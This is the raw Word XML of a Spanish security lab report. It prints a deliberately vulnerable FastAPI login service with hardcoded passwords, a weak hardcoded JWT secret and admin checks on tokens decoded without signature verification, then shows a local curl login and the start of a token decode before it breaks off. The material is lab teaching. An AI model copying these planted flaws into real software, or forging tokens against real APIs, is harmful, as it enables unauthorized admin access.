    <w:p w14:paraId="2D01044B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Archivo: vulnerable_auth.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0E6B18" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="120" w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  vulnerable_auth.py</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="1E31DB38" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
          </w:tcPr>
          <w:p w14:paraId="132F33E4" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="14E65FD6"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vulnerable_auth.py</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64F75C72"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from fastapi import FastAPI, HTTPException, Header</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00A27B1A"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from pydantic import BaseModel</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74594752"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import jwt</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2011FB72"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from typing import Optional</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CE7FD95"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AF82DAC"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app = FastAPI()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DFCF2BB"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BF8C235"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USERS = {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="013F2FAB"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"alice@example.com": {"password": "password123", "role": "user"},</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70146060"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"admin@example.com": {"password": "adminpass", "role": "admin"},</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58C237FD"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DEAC6B1"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22D54FB7"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JWT_SECRET = "supersecret"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C5FEA08"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JWT_ALGORITHM = "HS256"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36A22AD8"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="065276B7"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class LoginIn(BaseModel):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24A10095"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email: str</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FA00D26"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password: str</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A254D69"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1417907C"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@app.post("/login")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="670EA8A1"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def login(data: LoginIn):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3868228C"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user = USERS.get(data.email)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E022A95"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if not user or user["password"] != data.password:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="042841D1"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raise HTTPException(status_code=401, detail="Credenciales invÃ¡lidas")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17719E6F"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CD7C1F1"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token = jwt.encode({"sub": data.email, "role": user["role"]}, JWT_SECRET, algorithm=JWT_ALGORITHM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C382E89"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return {"access_token": token, "token_type": "bearer"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="125E44DE"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4584BF4E"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def insecure_decode_token(token: str):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10ABF831"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payload = jwt.decode(token, options={"verify_signature": False})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="305D3603"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return payload</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02EDCC23"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77BD1348"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@app.get("/admin")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B99B6AF"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def admin_panel(authorization: Optional[str] = Header(None)):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="430215FD"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if not authorization:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42127083"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raise HTTPException(401, "Missing token")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5873371E"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57165875"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token = authorization.split(" ")[1]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F4C6330"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lastRenderedPageBreak/>
              <w:t xml:space="preserve">    payload = insecure_decode_token(token)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0085E462"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B974311"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if payload.get("role") != "admin":</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64F4B73F"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raise HTTPException(403, "Forbidden")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B26C996"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return {"secret": "sÃ³lo admins pueden ver esto"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A104B9F"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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79B3BF9E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FCB0D27" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Inicio del servidor vulnerable (puerto 8000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC47BA5" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&gt; CMD – Inicio servidor vulnerable</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="2A1DFC25" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="2BC820C4" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="379DBF0B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>C:\...\lab_auth_security&gt; uvicorn vulnerable_auth:app --reload --port 8000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39B6D98B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36C48D74" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D735A75" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>INFO:     Started reloader process [12345] using WatchFiles</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D6200A3" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>INFO:     Started server process [12346]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73BF47A7" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>INFO:     Waiting for application startup.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C2CB4BA" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>INFO:     Application startup complete.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B5ED03C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F6781DC" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Prueba de login con credenciales reales</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EDBCA0" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Se realiza un POST al endpoint /login con credenciales válidas del administrador:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6A0896" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&gt; CMD – Login en API vulnerable</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="197FD363" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="0DD840C1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3C38F2EC" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -X POST "http://127.0.0.1:8000/login" \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FCC1429" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H "Content-Type: application/json" \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="032E4D3A" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -d '{"email":"admin@example.com","password":"adminpass"}'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="225565F1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4134870D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>{</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="172DC68E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9.-iK_7GIfHF1snU3JLB5EdQtHa7uEvYzG_ZfhJ4MXxWg",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5226FE57" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "token_type": "bearer"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CF837C2" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="57DD427F" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E4CF18E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Análisis del token JWT generado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DBB23F" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>El token HS256 tiene tres partes separadas por puntos (header.payload.signature):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F51F6AD" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&gt; Decodificación manual del JWT</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="1658B05E" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="767111E0" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6AC7C611" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Header  (base64): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D067895" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">         → { "alg": "HS256", "typ": "JWT" }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C4CB017" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
